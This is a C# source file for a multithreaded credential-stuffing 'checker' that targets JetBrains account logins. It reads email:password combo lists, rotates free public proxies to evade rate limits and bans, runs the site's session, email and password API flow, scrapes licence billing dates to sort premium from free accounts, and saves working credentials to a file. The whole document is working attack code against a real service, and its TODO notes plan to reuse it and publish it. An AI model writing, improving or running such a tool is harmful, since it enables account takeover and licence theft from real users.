using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Text.Json;
using Spectre.Console;

namespace Jetbrains;

public struct AuthSessionResponse
{
    public string id { get; set; }
    public string flow { get; set; }
}

public struct EmailLoginRequest
{
    public string email { get; set; }
    public bool shouldValidateEmail { get; set; }
}

public struct PasswordLoginRequest
{
    public bool shouldValidateEmail { get; set; }
    public string email { get; set; }
    public string password { get; set; }
}

public static class Program
{
    private static string ProxyPath = "C:\\Clion Projects\\jetbrains Refactored\\Proxy.txt";
    private static string ComboPath = "C:\\Clion Projects\\jetbrains Refactored\\Combo.txt";
    private static string GoodAccountsPath = "C:\\Clion Projects\\jetbrains Refactored\\Goods.txt";
    private static string HttpProxyUrl =
        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=10010";
    
    private const string BaseUrl = "https://account.jetbrains.com";
    
    private static int PremiumAccounts = 0;
    private static int FreeAccounts = 0;
    private static int BadAccounts = 0;
    
    // disconnection
    private static int BadProxies = 0;
    
    // timeout
    private static int RetryCount = 0;
    
    // limited by the website => gotta figure it out
    private static int BanCount = 0;
    
    private static int CPM = 0;
    private static string ETA = "0";
    private static string mem = "";
    
    static int TotalAccount = 0;
    static int TotalProxy = 0;
    private static string Remaining = "";
    
    private static int ComboIndex = 0;
    private static int ProxyIndex = 0;
    
    static ConcurrentQueue<string> AccountsQueue = new ConcurrentQueue<string>();
    static ConcurrentQueue<string> ProxiesQueue = new ConcurrentQueue<string>();
    
    private static TimeSpan time = new TimeSpan();
    private static int Elapsed = 0;
    
    // we dont care about streamWriter not being thread-safe, the odds of
    // multiple accounts being valid at the same time and being written
    // to file using streamWriter is very low, right ?
    private static StreamWriter streamWriter = new StreamWriter(GoodAccountsPath, true);
    
    private static int debug = 0;
    private static string Type = "";
    private static bool Finished = false;
    private static int Checks = 0;
    
    public static async Task Main(string[] args)
    {
        AccountLoader();
       
        // ProxyLoader(out List<string> Proxies);
        // TotalProxy = Proxies.Count;
        // Console.WriteLine(TotalProxy + " Proxies Loaded");
        // ProxiesQueue = new ConcurrentQueue<string>(Proxies);
        
        // loading proxies from proxyscrape for debug
        string[] Proxies = await ProxyDownloader();
        ProxiesQueue = new ConcurrentQueue<string>(Proxies);
        Console.WriteLine("Total Proxy Loaded = " + Proxies.Count());
        
        // based on the proxy type we should retrieve the proxies from proxyscrape api
        // right now we dont care, we are just debugging stuff
        HandleProxyType();
        
        int MaximumThreads = 0;
        Console.WriteLine("How Many Threads ? ");
        MaximumThreads = Convert.ToInt32(Console.ReadLine());
        
        var tasks = new List<Task>();
        for (int i = 1; i <= MaximumThreads; i++)
        {
            tasks.Add(Task.Run(() => HandleAccounts()));
        }
        
        Task GuiTask = new Task(HandleGui);
        GuiTask.Start();
        
        Task.WaitAll(tasks.ToArray());
        Finished = true;
        
        Console.WriteLine("Checking Finished");
        Console.ReadLine();
    }
    
    
    static void TableBuilder(string[] columns, int width, out Table table)
    {
        table = new Table();
        for(int i = 0; i < columns.Count(); i++)
        {
            table.AddColumn(new TableColumn(columns[i]).Centered());
        }
        table.Expand();
        for(int i = 0; i < columns.Count(); i++) 
        {
            table.Columns[i].Width(width);
        }
    }
    
    static async void HandleGui()
    {
        var Layout = new Layout("Main").SplitColumns(
            new Layout("BruteStats").SplitRows(
                new Layout("BruteTop").Size(7),
                new Layout("BruteBottom").Size(12)
            ),
            new Layout("ProxyStats")
        );
        
        // BruteTopTable 
        TableBuilder(new string[] {"Premium", "Free", "Bad"}, 20 , out Table BruteTopTable);
       
        // BruteBottomTable 
        TableBuilder(
                    new string[] {"Accounts", "Proxies", "CPM", "ETA", "Memory"},
                    20, 
                    out Table BruteBottomTable);
       
        // BruteTopPanel 
        var BruteTopPanel = new Panel(BruteTopTable);
        BruteTopPanel.Header("[bold yellow]Brute Top Stats [/]");
        BruteTopPanel.Border(BoxBorder.Rounded);
        
        // BruteBottomPanel
        var BruteBottomPanel = new Panel(BruteBottomTable);
        BruteBottomPanel.Header("[bold yellow]Brute Bottom Stats [/]");
        BruteBottomPanel.Border(BoxBorder.Rounded);
        BruteBottomPanel.Expand();
        
        // ProxyTable 
        var ProxyTable = new Table();
        ProxyTable.AddColumn(new TableColumn("Bad").Centered());
        ProxyTable.AddColumn(new TableColumn("Retry").Centered());
        ProxyTable.AddColumn(new TableColumn("Ban").Centered());
        ProxyTable.Expand();
        ProxyTable.Columns[0].Width(20);
        ProxyTable.Columns[1].Width(20);
        ProxyTable.Columns[2].Width(20);
        
        // ProxyPanel
        var ProxyPanel = new Panel(ProxyTable);
        ProxyPanel.Header("[bold yellow]Proxy Stats [/]");
        ProxyPanel.Border(BoxBorder.Rounded);
        
        // Update the layout with the new panels
        Layout["BruteTop"].Update(BruteTopPanel);
        Layout["BruteBottom"].Update(BruteBottomPanel);
        Layout["ProxyStats"].Update(ProxyPanel);
        
        // Live Gui
        AnsiConsole
            .Live(Layout)
            .Start(ctx =>
            {
               
                while (Finished == false)
                {
                    // update BruteTable rows
                    BruteTopTable.Rows.Clear();
                    BruteTopTable.AddRow(
                        PremiumAccounts.ToString(),
                        FreeAccounts.ToString(),
                        BadAccounts.ToString()
                    );
                    
                    // ETA
                    time = TimeSpan.FromSeconds(Elapsed);
                    ETA = time.ToString(@"mm\:ss");
                    
                    // CPM
                    if (Elapsed % 60 == 0)
                    {
                        // CPM doesnt need a lock, since the other threads are only
                        // incrementing with Interlocked
                        CPM = 0;
                    }
                    
                    // Memory 
                    Process process = Process.GetCurrentProcess();
                    mem = (process.WorkingSet64 / (1024 * 1024)).ToString() + " MB";
                    
                    // Accounts 
                    Remaining = String.Format("{0}/{1}", Checks, TotalAccount);
                    BruteBottomTable.Rows.Clear();
                    BruteBottomTable.AddRow(
                        Remaining,
                        TotalProxy.ToString(),
                        CPM.ToString(),
                        ETA,
                        mem 
                    );
                    
                    // update ProxyTable rows
                    ProxyTable.Rows.Clear();
                    ProxyTable.AddRow(
                        BadProxies.ToString(),
                        RetryCount.ToString(),
                        BanCount.ToString()
                    );
                    
                    ctx.Refresh();
                    Thread.Sleep(1000);
                    Elapsed++;
                }
            });
    }
    
    static async Task HandleAccounts()
    {
        string Email = "";
        string Password = "";
        string proxy = "";
        
        while (ProxiesQueue.TryDequeue(out var Proxy) != false)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            cts.CancelAfter(TimeSpan.FromSeconds(20));
            
            if (AccountsQueue.IsEmpty)
            {
                // Console.WriteLine("Task " + Task.CurrentId + " Finished Checking");
                break;
            }
            
            proxy = Proxy;
            // because we dont want to go out of proxies, we just keep rotating
            ProxiesQueue.Enqueue(proxy);
            
            while (AccountsQueue.TryDequeue(out string Account) != false)
            {
                string[] LineSplit = Account.Split(":");
                Email = LineSplit[0];
                Password = LineSplit[1];

                // need to write a better error handler
                try
                {
                    await HandleRequests(Email, Password, proxy, cts);
                    // after a valid Request,increment CPM
                    Interlocked.Increment(ref CPM);
                    Interlocked.Increment(ref Checks);
                }
                catch (Exception ex)
                {
                    // Console.WriteLine(ex.Message);
                    AccountsQueue.Enqueue(Account);
                }
                
                break;
            }
        }
    }
    
    static void AccountLoader()
    {
        List<string> Accounts = new List<string>();
        string CurrentLine = "";
        
        StreamReader ComboReader = new StreamReader(ComboPath);
        while ((CurrentLine = ComboReader.ReadLine()) != null)
        {
            Accounts.Add(CurrentLine);
        }
        
        TotalAccount = Accounts.Count;
        Console.WriteLine(TotalAccount + " Accounts Loaded");
        AccountsQueue = new ConcurrentQueue<string>(Accounts);
    }
    
    // quick debug with Proxyscrape api
    static async Task<string[]> ProxyDownloader()
    {
        Uri ProxyUrl = new Uri(HttpProxyUrl);
        
        HttpClient client = new HttpClient();
        HttpResponseMessage response = await client.GetAsync(ProxyUrl);
        string resp = await response.Content.ReadAsStringAsync();
        
        string[] proxies = resp.Split("\n");
        return proxies;
    }
    
    static void ProxyLoader(out List<string> Proxies)
    {
        Proxies = new List<string>();
        string CurrentLine = "";
        
        StreamReader ProxyReader = new StreamReader(ProxyPath);
        while ((CurrentLine = ProxyReader.ReadLine()) != null)
        {
            Proxies.Add(CurrentLine);
        }
    }
    
    static async Task HandleRequests(string Email, string Password, string Proxy, CancellationTokenSource cts)
    {
        // TODO => need to handle different proxy types which is pretty easy
        // string HttpProxy = "http://" + Proxy;
        string ProxyFormat = Type + "://" + Proxy;
        WebProxy webProxy = new WebProxy() { Address = new Uri(ProxyFormat), UseDefaultCredentials = true };
        
        using var client = CreateHttpClient(webProxy, out var cookieContainer);
        
        // Perform the first request to get JBA cookie
        await client.GetStringAsync($"{BaseUrl}/login?reauthenticate=false", cts.Token);
        var authCookie = GetCookieByIndex(cookieContainer, 0);
        
        // Getting SessionID
        var sessionId = await CreateAuthSession(client, authCookie, cts.Token);
        
        // Email Request
        var emailResponse = await EmailLogin(client, Email, authCookie, sessionId, cts.Token);
        if (BadEmail(emailResponse) == true)
        {
            Interlocked.Increment(ref BadAccounts);
            return;
        }
        
        // Password Request
        var LoginResponse = await PasswordLogin(client, Email, Password, authCookie, sessionId, cts.Token);
        
        if (BadPassword(LoginResponse) == true)
        {
            Interlocked.Increment(ref BadAccounts);
            return;
        }
        
        // Account Info + Expiration Date => print and Save to file
        var AccountInfo = await CheckLicenseStatus(client, Email, Password, cookieContainer, cts.Token);
        
        // Interlocked.Increment(ref Premium);
        // Console.WriteLine(AccountInfo + " || " + ProxyFormat);
    }
    
    static HttpClient CreateHttpClient(WebProxy proxy, out CookieContainer cookies)
    {
        cookies = new CookieContainer();
        var handler = new HttpClientHandler
        {
            UseProxy = true,
            Proxy = proxy,
            
            UseCookies = true,
            CookieContainer = cookies,
        };
        return new HttpClient(handler);
    }
    
    static async Task<string> CreateAuthSession(
        HttpClient client,
        Cookie authCookie,
        CancellationToken ctsToken
    )
    {
        var request = new HttpRequestMessage(HttpMethod.Post, $"{BaseUrl}/api/auth/sessions")
        {
            Content = new StringContent("", Encoding.UTF8, "application/json"),
        };
        AddAuthHeaders(request, authCookie);
        var response = await client.SendAsync(request, ctsToken);
        return ParseSessionId(await response.Content.ReadAsStringAsync());
    }
    
    static async Task<string> EmailLogin(
        HttpClient client,
        string AuthEmail,
        Cookie authCookie,
        string sessionId,
        CancellationToken ctsToken
    )
    {
        var emailRequest = new HttpRequestMessage(
            HttpMethod.Post,
            $"{BaseUrl}/api/auth/sessions/{sessionId}/email/login"
        )
        {
            Content = new StringContent(
                JsonSerializer.Serialize(
                    new EmailLoginRequest { email = AuthEmail, shouldValidateEmail = false }
                ),
                Encoding.UTF8,
                "application/json"
            ),
        };
        
        AddAuthHeaders(emailRequest, authCookie);
        var response = await client.SendAsync(emailRequest, ctsToken);
        return await response.Content.ReadAsStringAsync();
    }
    
    static bool BadEmail(string emailResponse)
    {
        if (
            emailResponse.Contains("We couldn't find")
            || emailResponse.Contains("InvalidEmail")
            || emailResponse.Contains("AccountNotFound")
        )
        {
            // Console.WriteLine("Bad Email");
            return true;
        }
        
        return false;
    }
    
    static async Task<string> PasswordLogin(
        HttpClient client,
        string AuthEmail,
        string AuthPassword,
        Cookie authCookie,
        string sessionId,
        CancellationToken ctsToken
    )
    {
        var passwordRequest = new HttpRequestMessage(
            HttpMethod.Post,
            $"{BaseUrl}/api/auth/sessions/{sessionId}/password"
        )
        {
            Content = new StringContent(
                JsonSerializer.Serialize(
                    new PasswordLoginRequest
                    {
                        email = AuthEmail,
                        password = AuthPassword,
                        shouldValidateEmail = false,
                    }
                ),
                Encoding.UTF8,
                "application/json"
            ),
        };
        AddAuthHeaders(passwordRequest, authCookie);
        var response = await client.SendAsync(passwordRequest, ctsToken);
        return await response.Content.ReadAsStringAsync();
    }
    
    static bool BadPassword(string response)
    {
        if (response.Contains("authenticated"))
        {
            return false;
        }
        else if (response.Contains("IncorrectPassword"))
        {
            // Console.WriteLine("Invalid Account ===> wrong Password");
            return true;
        }
        else
        {
            // Console.WriteLine("Invalid Account ===> Unknown Error");
            return true;
        }
    }
    
    static async Task<string> CheckLicenseStatus(
        HttpClient client,
        string AuthEmail,
        string AuthPassword,
        CookieContainer cookieContainer,
        CancellationToken ctsToken
    )
    {
        var licenseRequest = new HttpRequestMessage(HttpMethod.Get, $"{BaseUrl}/licenses");
        licenseRequest.Headers.Add("Cookie", GetAllCookiesString(cookieContainer));
        var response = await client.SendAsync(licenseRequest, ctsToken);
        var body = await response.Content.ReadAsStringAsync();
        
        string date = ParseDateByPrefixSuffix(
            body,
            "<div class=\"well-label\">Billing date:</div>",
            "</span>"
        );
        string AccountInfo =
            "Email = " + AuthEmail + " || " + "Password = " + AuthPassword + " || Expiration Date = " + date;
        
        streamWriter.WriteLine(AccountInfo);
        streamWriter.Flush();
        
        if (date == null)
        {
            Interlocked.Increment(ref FreeAccounts);
        }
        else
        {
            Interlocked.Increment(ref PremiumAccounts);
        }
        
        return AccountInfo;
    }
    
    static string ParseDateByPrefixSuffix(string html, string prefix, string suffix)
    {
        int prefixIndex = html.IndexOf(prefix);
        if (prefixIndex == -1)
            return null;
        
        int start = prefixIndex + prefix.Length + 74;
        int suffixIndex = html.IndexOf(suffix, start);
        if (suffixIndex == -1)
            return null;
        
        string Date = html.Substring(start, suffixIndex - start);
        return Date;
    }
    
    static void AddAuthHeaders(HttpRequestMessage request, Cookie authCookie)
    {
        var cookieString = $"{authCookie.Name}={authCookie.Value}";
        request.Headers.Add("Cookie", cookieString);
        request.Headers.Add("X-XSRF-TOKEN", authCookie.Value);
    }
    
    static string GetAllCookiesString(CookieContainer container)
    {
        return string.Join("; ", container.GetAllCookies().Cast<Cookie>());
    }
    
    static Cookie GetCookieByIndex(CookieContainer container, int index)
    {
        return container.GetAllCookies().Cast<Cookie>().ElementAt(index);
    }
    
    static string ParseSessionId(string responseBody)
    {
        return JsonSerializer.Deserialize<AuthSessionResponse>(responseBody).id;
    }
    
    static void HandleProxyType()
    {
        Console.WriteLine("Proxy Type ? http, socks4, socks5");
        string type = Console.ReadLine();
        if (type == null)
            Console.WriteLine("Proxy Type Not Specified");
        if (type != "http" && type != "socks4" && type != "socks5" && type == null)
        {
            Console.WriteLine("Wrong Proxy Type, Choose between http, socks4, socsk5");
            Console.WriteLine("closing the app in 5 seconds");
            Thread.Sleep(5000);
        }
        Type = type;
    }
}

// TODO =>
// 1 - Bot Input
// 2 - Proxy Type Input
// 3 - Console UI and Layout
// 4 - generalize more stuff => so we dont have to write the next checker from scratch
// 5 - https://spectreconsole.net/
/*
        // TODO
        // => Cts Timeout input
        // Bad proxy , retry , Ban handling => how to refresh them ? proper showcase of rotation ?
        // UI => checker stats => cpm, loaded accs and proxies, ETA,
        // UI => Progress Bar
        // EXTRA => Full Capturing Premium Accs
        // UI => when checking is done, display cooler stuff and colored things, also color
        // the numbers for premium free and bad
        // UI => Better and more Modern User Prompt, timeout, threads, proxy
        // => add two proxy mode, one from proxyscrape, one from proxies.txt
        // => Clean Up, make the checker as reusable as possible
        // => Make the code less newbie, less dirty , more modern , more structured
        //    Because it Matters A lot
        // => make a video if possible, if not A very good representation with photos and
        //    a Consice github Readme
        
*/
